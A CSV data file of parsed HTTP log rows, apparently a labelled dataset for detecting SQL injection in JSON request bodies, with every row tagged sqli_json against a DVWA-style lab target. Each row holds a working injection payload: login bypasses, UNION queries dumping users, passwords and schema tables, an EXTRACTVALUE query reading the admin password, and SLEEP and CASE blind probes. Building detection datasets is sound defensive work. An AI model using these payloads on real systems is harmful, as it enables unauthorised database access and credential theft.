ip,timestamp,method,url,path,query,protocol,status,size,response_time,referer,user_agent,decoded_url,decoded_query,body,decoded_body,content_type,is_json_payload,json_depth,param_count_body,attack_type,existing_label
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,2139,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/api/v1/query,,"{""query"": ""laptop' UNION select 1,version() ;-- -"", ""limit"": 1}","query laptop' UNION select 1,version() ;-- - limit 1",application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/search,/api/v1/search,,HTTP/1.1,200,1150,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/search,,"{""data"": {""search"": ""' OR 1=1 -- -"", ""category"": ""all""}}",data search ' OR 1=1 -- - category all,application/json,1,2,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/profile,/api/v1/profile,,HTTP/1.1,200,2623,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/profile,,"{""query"": ""laptop' UNION select user,password ;-- -"", ""limit"": 19}","query laptop' UNION select user,password ;-- - limit 19",application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/profile,/api/v1/profile,,HTTP/1.1,200,3541,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/api/v1/profile,,"{""data"": {""search"": ""' OR 1=1 --"", ""category"": ""all""}}",data search ' OR 1=1 -- category all,application/json,1,2,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,1185,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/query,,"{""username"": ""admin' Or 'a'='a' -- -"", ""password"": ""100""}",username admin' Or 'a'='a' -- - password 100,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/rest/items,/rest/items,,HTTP/1.1,200,2766,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/rest/items,,"{""order_by"": ""id' union SElECT 1,2 from users --""}","order_by id' union SElECT 1,2 from users --",application/json,1,1,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/auth,/api/v1/auth,,HTTP/1.1,200,1559,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/auth,,"{""query"": ""laptop' UNION SELECT 1,2 --"", ""limit"": 36}","query laptop' UNION SELECT 1,2 -- limit 36",application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/profile,/api/v1/profile,,HTTP/1.1,200,2216,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/profile,,"{""username"": ""admin' or ASCII('A')=65 --"", ""password"": ""67""}",username admin' or ASCII('A')=65 -- password 67,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/rest/items,/rest/items,,HTTP/1.1,200,2874,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/rest/items,,"{""search"": ""' UNION ALL SELECT null, 1,2 FROM users ;-- -"", ""page"": 9}","search ' UNION ALL SELECT null, 1,2 FROM users ;-- - page 9",application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/search,/api/v1/search,,HTTP/1.1,200,3533,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/search,,"{""items"": [{""id"": ""1' OR LENGTH('test')=4 -- -"", ""qty"": 1}]}",items id 1' OR LENGTH('test')=4 -- - qty 1,application/json,1,3,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/users,/api/v1/users,,HTTP/1.1,200,2172,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/api/v1/users,,"{""auth"": {""username"": ""admin'-- -"", ""password"": ""18""}, ""remember"": true}",auth username admin'-- - password 18 remember True,application/json,1,2,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/rest/items,/rest/items,,HTTP/1.1,200,2207,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/rest/items,,"{""query"": ""laptop' UNION SELECT 1,version() --"", ""limit"": 29}","query laptop' UNION SELECT 1,version() -- limit 29",application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,3149,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/query,,"{""items"": [{""id"": ""1' OR 100<200 ;-- -"", ""qty"": 1}]}",items id 1' OR 100<200 ;-- - qty 1,application/json,1,3,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/auth,/api/v1/auth,,HTTP/1.1,200,2302,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/api/v1/auth,,"{""search"": ""' UNION ALL SELECT null, table_name,table_schema FROM users ;-- -"", ""page"": 39}","search ' UNION ALL SELECT null, table_name,table_schema FROM users ;-- - page 39",application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/profile,/api/v1/profile,,HTTP/1.1,200,3070,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/profile,,"{""user"": {""name"": ""test' AnD (SELECT COUNT(*) FROM users)>2 "", ""role"": ""user""}}",user name test' AnD (SELECT COUNT(*) FROM users)>2  role user,application/json,1,2,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/auth,/api/v1/auth,,HTTP/1.1,200,1224,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/auth,,"{""query"": ""laptop' Union Select 1,version() -- -"", ""limit"": 37}","query laptop' Union Select 1,version() -- - limit 37",application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/users,/api/v1/users,,HTTP/1.1,200,1390,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/users,,"{""username"": ""admin' OR ASCII('A')=65 -- -"", ""password"": ""27""}",username admin' OR ASCII('A')=65 -- - password 27,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/rest/items,/rest/items,,HTTP/1.1,200,2407,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/rest/items,,"{""auth"": {""username"": ""admin'-- -"", ""password"": ""46""}, ""remember"": true}",auth username admin'-- - password 46 remember True,application/json,1,2,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/auth,/api/v1/auth,,HTTP/1.1,200,2422,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/auth,,"{""username"": ""admin' OR 2>1 "", ""password"": ""18""}",username admin' OR 2>1  password 18,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/rest/items,/rest/items,,HTTP/1.1,200,4211,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/rest/items,,"{""id"": ""1' And EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()))) ""}","id 1' And EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()))) ",application/json,1,1,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/auth,/api/v1/auth,,HTTP/1.1,200,557,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/auth,,"{""filter"": {""user_id"": ""1' AND SLEEP(1) /*"", ""status"": ""active""}}",filter user_id 1' AND SLEEP(1) /* status active,application/json,1,2,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,3819,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/query,,"{""user"": {""name"": ""test' AND (SELECT COUNT(*) From users)>35 --"", ""role"": ""user""}}",user name test' AND (SELECT COUNT(*) From users)>35 -- role user,application/json,1,2,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/profile,/api/v1/profile,,HTTP/1.1,200,2982,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/profile,,"{""order_by"": ""id' Union sELEcT user,password From information_schema.tables /*""}","order_by id' Union sELEcT user,password From information_schema.tables /*",application/json,1,1,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/users,/api/v1/users,,HTTP/1.1,200,1802,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/users,,"{""items"": [{""id"": ""1' Or 1=1 /*"", ""qty"": 1}]}",items id 1' Or 1=1 /* qty 1,application/json,1,3,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/users,/api/v1/users,,HTTP/1.1,200,2376,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/api/v1/users,,"{""username"": ""admin' OR LENGTH('test')=4 #"", ""password"": ""27""}",username admin' OR LENGTH('test')=4 # password 27,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/users,/api/v1/users,,HTTP/1.1,200,853,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/api/v1/users,,"{""data"": {""search"": ""' or 1=1 ;-- -"", ""category"": ""all""}}",data search ' or 1=1 ;-- - category all,application/json,1,2,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/rest/items,/rest/items,,HTTP/1.1,200,2605,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/rest/items,,"{""items"": [{""id"": ""1' OR CHAR(97)='a' "", ""qty"": 1}]}",items id 1' OR CHAR(97)='a'  qty 1,application/json,1,3,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/rest/items,/rest/items,,HTTP/1.1,200,2358,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/rest/items,,"{""items"": [{""id"": ""1' OR 2>1 -- -"", ""qty"": 1}]}",items id 1' OR 2>1 -- - qty 1,application/json,1,3,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/rest/items,/rest/items,,HTTP/1.1,200,1754,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/rest/items,,"{""comment"": ""test' AND CASE WHEN (2>1) THEN 1/0 ELSE 1 END #"", ""post_id"": 24}",comment test' AND CASE WHEN (2>1) THEN 1/0 ELSE 1 END # post_id 24,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/users,/api/v1/users,,HTTP/1.1,200,2639,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/api/v1/users,,"{""order_by"": ""id' UNION Select 1,2 FROM dvwa.users --""}","order_by id' UNION Select 1,2 FROM dvwa.users --",application/json,1,1,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/rest/items,/rest/items,,HTTP/1.1,200,1058,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/rest/items,,"{""comment"": ""test' and case WHEN (LENGTH('test')=4) THEN 1/0 Else 1 End /*"", ""post_id"": 7}",comment test' and case WHEN (LENGTH('test')=4) THEN 1/0 Else 1 End /* post_id 7,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/search,/api/v1/search,,HTTP/1.1,200,4160,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/search,,"{""order_by"": ""id' Union sELecT user,password from information_schema.tables --""}","order_by id' Union sELecT user,password from information_schema.tables --",application/json,1,1,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/profile,/api/v1/profile,,HTTP/1.1,200,3447,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/api/v1/profile,,"{""comment"": ""test' AND Case wheN ('a'='a') THEN 1/0 Else 1 END --"", ""post_id"": 42}",comment test' AND Case wheN ('a'='a') THEN 1/0 Else 1 END -- post_id 42,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/profile,/api/v1/profile,,HTTP/1.1,200,3137,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/profile,,"{""search"": ""' union ALL SELECT null, table_name,table_schema FRoM information_schema.tables --"", ""page"": 22}","search ' union ALL SELECT null, table_name,table_schema FRoM information_schema.tables -- page 22",application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/auth,/api/v1/auth,,HTTP/1.1,200,989,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/auth,,"{""comment"": ""test' AND CASE WHEN (100<200) THEN 1/0 ELSE 1 END ;-- -"", ""post_id"": 9}",comment test' AND CASE WHEN (100<200) THEN 1/0 ELSE 1 END ;-- - post_id 9,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,505,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/query,,"{""filter"": {""user_id"": ""1' And SLEEP(1) #"", ""status"": ""active""}}",filter user_id 1' And SLEEP(1) # status active,application/json,1,2,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/search,/api/v1/search,,HTTP/1.1,200,4045,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/search,,"{""comment"": ""test' AND CASE WHEN ('a'='a') THEN 1/0 ELSE 1 END #"", ""post_id"": 4}",comment test' AND CASE WHEN ('a'='a') THEN 1/0 ELSE 1 END # post_id 4,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,3143,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/query,,"{""user"": {""name"": ""test' and (SELECT COUNT(*) from users)>21 "", ""role"": ""user""}}",user name test' and (SELECT COUNT(*) from users)>21  role user,application/json,1,2,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/users,/api/v1/users,,HTTP/1.1,200,636,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/users,,"{""comment"": ""test' AND CASE WHEN (CHAR(97)='a') THEN 1/0 ELSE 1 END /*"", ""post_id"": 44}",comment test' AND CASE WHEN (CHAR(97)='a') THEN 1/0 ELSE 1 END /* post_id 44,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/users,/api/v1/users,,HTTP/1.1,200,3484,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/users,,"{""id"": ""1' and EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) ;-- -""}","id 1' and EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) ;-- -",application/json,1,1,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/users,/api/v1/users,,HTTP/1.1,200,2723,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/users,,"{""query"": ""laptop' union SELECT column_name,null -- -"", ""limit"": 21}","query laptop' union SELECT column_name,null -- - limit 21",application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,3755,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/api/v1/query,,"{""items"": [{""id"": ""1' OR 7=7 "", ""qty"": 1}]}",items id 1' OR 7=7  qty 1,application/json,1,3,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,3326,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/query,,"{""username"": ""admin' or 2>1 --"", ""password"": ""4""}",username admin' or 2>1 -- password 4,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/users,/api/v1/users,,HTTP/1.1,200,2048,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/users,,"{""id"": ""1' And EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE user='admin'))) ""}","id 1' And EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE user='admin'))) ",application/json,1,1,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/users,/api/v1/users,,HTTP/1.1,200,4470,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/users,,"{""items"": [{""id"": ""1' Or CHAR(97)='a' --"", ""qty"": 1}]}",items id 1' Or CHAR(97)='a' -- qty 1,application/json,1,3,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/auth,/api/v1/auth,,HTTP/1.1,200,3104,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/api/v1/auth,,"{""order_by"": ""id' union Select column_name,null FROM information_schema.tables ;-- -""}","order_by id' union Select column_name,null FROM information_schema.tables ;-- -",application/json,1,1,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/search,/api/v1/search,,HTTP/1.1,200,2409,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/search,,"{""comment"": ""test' AND CASE WHen (ASCII('A')=65) then 1/0 Else 1 END #"", ""post_id"": 30}",comment test' AND CASE WHen (ASCII('A')=65) then 1/0 Else 1 END # post_id 30,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/rest/items,/rest/items,,HTTP/1.1,200,1281,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/rest/items,,"{""items"": [{""id"": ""1' OR 7=7 -- -"", ""qty"": 1}]}",items id 1' OR 7=7 -- - qty 1,application/json,1,3,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/search,/api/v1/search,,HTTP/1.1,200,3616,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/search,,"{""order_by"": ""id' UNION SELECT 1,2 FROM information_schema.columns --""}","order_by id' UNION SELECT 1,2 FROM information_schema.columns --",application/json,1,1,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/search,/api/v1/search,,HTTP/1.1,200,2780,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/search,,"{""auth"": {""username"": ""admin'-- -"", ""password"": ""60""}, ""remember"": true}",auth username admin'-- - password 60 remember True,application/json,1,2,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/auth,/api/v1/auth,,HTTP/1.1,200,1475,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/auth,,"{""items"": [{""id"": ""1' OR ASCII('A')=65 ;-- -"", ""qty"": 1}]}",items id 1' OR ASCII('A')=65 ;-- - qty 1,application/json,1,3,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/profile,/api/v1/profile,,HTTP/1.1,200,3308,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/profile,,"{""comment"": ""test' AND cASe WhEN (1=1) Then 1/0 Else 1 END /*"", ""post_id"": 26}",comment test' AND cASe WhEN (1=1) Then 1/0 Else 1 END /* post_id 26,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,3934,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/query,,"{""auth"": {""username"": ""admin'-- -"", ""password"": ""80""}, ""remember"": true}",auth username admin'-- - password 80 remember True,application/json,1,2,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,847,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/query,,"{""comment"": ""test' AND CASE When (2>1) ThEN 1/0 else 1 EnD #"", ""post_id"": 30}",comment test' AND CASE When (2>1) ThEN 1/0 else 1 EnD # post_id 30,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/rest/items,/rest/items,,HTTP/1.1,200,850,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/rest/items,,"{""id"": ""1' And EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()))) ;-- -""}","id 1' And EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()))) ;-- -",application/json,1,1,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/rest/items,/rest/items,,HTTP/1.1,200,3289,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/rest/items,,"{""comment"": ""test' AND CASE WHEN (ASCII('A')=65) THEN 1/0 ELSE 1 END /*"", ""post_id"": 39}",comment test' AND CASE WHEN (ASCII('A')=65) THEN 1/0 ELSE 1 END /* post_id 39,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/rest/items,/rest/items,,HTTP/1.1,200,580,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/rest/items,,"{""items"": [{""id"": ""1' OR 7=7 #"", ""qty"": 1}]}",items id 1' OR 7=7 # qty 1,application/json,1,3,1,sqli_json,1
